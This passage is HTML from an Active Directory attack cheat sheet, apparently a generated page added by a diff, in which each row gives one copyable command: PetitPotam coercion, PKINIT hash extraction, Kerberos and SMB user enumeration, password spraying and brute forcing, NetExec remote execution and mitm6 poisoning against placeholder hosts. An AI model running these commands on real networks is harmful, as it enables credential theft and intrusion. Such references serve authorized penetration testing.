+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PowerView-Get-DomainGroupMember/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PowerView-Get-DomainGroupMember/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainGroupMember/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainGroupMember/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Get-DomainGroupMember/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PowerView-Find-DomainShare/" id="/wadcoms/PowerView-Find-DomainShare/" style="text-decoration: none; color: DarkGreen;">Find-DomainShare -CheckShareAccess -Domain test.local -DomainController 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PowerView-Find-DomainShare/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PowerView-Find-DomainShare/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Find-DomainShare/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Find-DomainShare/#Shell">Shell</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PowerView-Find-DomainShare/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PetitPotam/" id="/wadcoms/PetitPotam/" style="text-decoration: none; color: DarkGreen;">python3 PetitPotam.py -d test.local -u john -p password123 10.10.10.2 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PetitPotam/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PetitPotam/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#RPC">RPC</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#NTLM">NTLM</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PetitPotam/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PKINIT-gettgtpkinit/" id="/wadcoms/PKINIT-gettgtpkinit/" style="text-decoration: none; color: DarkGreen;">python3 gettgtpkinit.py test.local/DC01\$ -cert-pfx crt.pfx -pfx-pass password123 out.ccache
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PKINIT-gettgtpkinit/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PKINIT-gettgtpkinit/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#PFX">PFX</a></li>
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-gettgtpkinit/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/PKINIT-getnthash/" id="/wadcoms/PKINIT-getnthash/" style="text-decoration: none; color: DarkGreen;">KRB5CCNAME=out.ccache python3 getnthash.py test.local/DC01\$ -key 6e63333c372d7fbe64dab63f36673d0cd03bfb92b2a6c96e70070be7cb07f773
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/PKINIT-getnthash/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/PKINIT-getnthash/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-getnthash/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-getnthash/#PrivEsc">Privilege Escalation</a></li>
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-getnthash/#TGT">TGT</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-getnthash/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-getnthash/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/PKINIT-getnthash/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Nmap-Krb5-Enum-Users/" id="/wadcoms/Nmap-Krb5-Enum-Users/" style="text-decoration: none; color: DarkGreen;">nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm=&#39;test.local&#39;,userdb=usernames.txt 10.10.10.1
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Nmap-Krb5-Enum-Users/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Nmap-Krb5-Enum-Users/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Nmap-Krb5-Enum-Users/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Nmap-Krb5-Enum-Users/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Nmap-Krb5-Enum-Users/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Nmap-Krb5-Enum-Users/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Nmap-Krb5-Enum-Users/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-SMB-Password-Spray/" id="/wadcoms/NetExec-SMB-Password-Spray/" style="text-decoration: none; color: DarkGreen;">nxc smb 10.10.10.1 -u users.txt -p password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-SMB-Password-Spray/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-SMB-Password-Spray/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-SMB-Password-Spray/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-SMB-Password-Spray/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-SMB-Password-Spray/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-SMB-Password-Spray/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-Exec-SMB/" id="/wadcoms/NetExec-Exec-SMB/" style="text-decoration: none; color: DarkGreen;">nxc smb 10.10.10.1 -u &#39;john&#39; -p &#39;password123&#39; -X &#39;$Host&#39;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-Exec-SMB/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-Exec-SMB/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Exec-SMB/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Exec-SMB/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Exec-SMB/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Exec-SMB/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Exec-SMB/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-Enum-SMB/" id="/wadcoms/NetExec-Enum-SMB/" style="text-decoration: none; color: DarkGreen;">nxc smb 10.10.10.1 -u &#39;john&#39; -p &#39;password123&#39; --groups --local-groups --loggedon-users --rid-brute --sessions --users --shares --pass-pol
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-Enum-SMB/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-Enum-SMB/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-Enum-SMB-Relay-List/" id="/wadcoms/NetExec-Enum-SMB-Relay-List/" style="text-decoration: none; color: DarkGreen;">nxc smb smb_host.txt --gen-relay-list output.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-Enum-SMB-Relay-List/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-Enum-SMB-Relay-List/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Relay-List/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Relay-List/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Relay-List/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Relay-List/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-Enum-SMB-Null/" id="/wadcoms/NetExec-Enum-SMB-Null/" style="text-decoration: none; color: DarkGreen;">nxc smb 10.10.10.1 -u &#39;&#39; -p &#39;&#39;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-Enum-SMB-Null/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-Enum-SMB-Null/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Null/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Null/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Null/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Null/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-Enum-SMB-Anonymous/" id="/wadcoms/NetExec-Enum-SMB-Anonymous/" style="text-decoration: none; color: DarkGreen;">nxc smb 10.10.10.1 -u &#39;a&#39; -p &#39;&#39;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-Enum-SMB-Anonymous/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-Enum-SMB-Anonymous/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Anonymous/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Anonymous/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Anonymous/#SMB">SMB</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-SMB-Anonymous/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/NetExec-Enum-LDAP/" id="/wadcoms/NetExec-Enum-LDAP/" style="text-decoration: none; color: DarkGreen;">nxc ldap 10.10.10.1 -u &#39;john&#39; -p &#39;password123&#39; --trusted-for-delegation  --password-not-required --admin-count --users --groups
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/NetExec-Enum-LDAP/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/NetExec-Enum-LDAP/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-LDAP/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-LDAP/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-LDAP/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-LDAP/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/NetExec-Enum-LDAP/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Mitm6/" id="/wadcoms/Mitm6/" style="text-decoration: none; color: DarkGreen;">mitm6 -d test.local --ignore-nofqnd
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Mitm6/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Mitm6/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Mitm6/#Exploitation">Exploitation</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Mitm6/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Mitm6/#DNS">DNS</a></li>
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Mitm6/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Mitm6/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/LDAPSearch-NoCreds/" id="/wadcoms/LDAPSearch-NoCreds/" style="text-decoration: none; color: DarkGreen;">ldapsearch -LLL -x -H ldap://test.local -b&#39;&#39; -s base &#39;(objectclass=\*)&#39;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/LDAPSearch-NoCreds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/LDAPSearch-NoCreds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-NoCreds/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-NoCreds/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-NoCreds/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-NoCreds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/LDAPSearch-Creds/" id="/wadcoms/LDAPSearch-Creds/" style="text-decoration: none; color: DarkGreen;">ldapsearch -h test.local -D &#39;ldap@test.local&#39; -w password123 -b &#39;dc=test,dc=local&#39;
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/LDAPSearch-Creds/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/LDAPSearch-Creds/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-Creds/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-Creds/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-Creds/#Password">Password</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-Creds/#LDAP">LDAP</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/LDAPSearch-Creds/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Kerbrute-UserEnum/" id="/wadcoms/Kerbrute-UserEnum/" style="text-decoration: none; color: DarkGreen;">kerbrute userenum -d test.local usernames.txt
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Kerbrute-UserEnum/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Kerbrute-UserEnum/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-UserEnum/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-UserEnum/#No_Creds">No Creds</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-UserEnum/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-UserEnum/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-UserEnum/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Kerbrute-PasswordSpray/" id="/wadcoms/Kerbrute-PasswordSpray/" style="text-decoration: none; color: DarkGreen;">kerbrute passwordspray -d test.local domain_users.txt password123
+</a></div><div style="flex: 1;"><a href="javascript:void(0)" onclick="copyFunction('/wadcoms/Kerbrute-PasswordSpray/')"><img src="/assets/copy-button.svg" alt="Copy" title="Copy" id="/wadcoms/Kerbrute-PasswordSpray/_img" /></a></div></div><p style="margin-top: -12px;"><ul class="filter-list">
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-PasswordSpray/#Enumeration">Enumeration</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-PasswordSpray/#Username">Username</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-PasswordSpray/#Kerberos">Kerberos</a></li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-PasswordSpray/#Linux">Linux</a></li>
+    
+    
+    
+    
+    
+    <li><a href="/wadcoms/Kerbrute-PasswordSpray/#Windows">Windows</a></li>
+    
+    
+</ul>
+</p></td>
+            </tr>
+            
+            <tr>
+		    <td><div class="bin-name"><div style="flex: 0 0 97%"><a href="/wadcoms/Kerbrute-BruteUser/" id="/wadcoms/Kerbrute-BruteUser/" style="text-decoration: none; color: DarkGreen;">kerbrute bruteuser -d test.local passwords.txt john
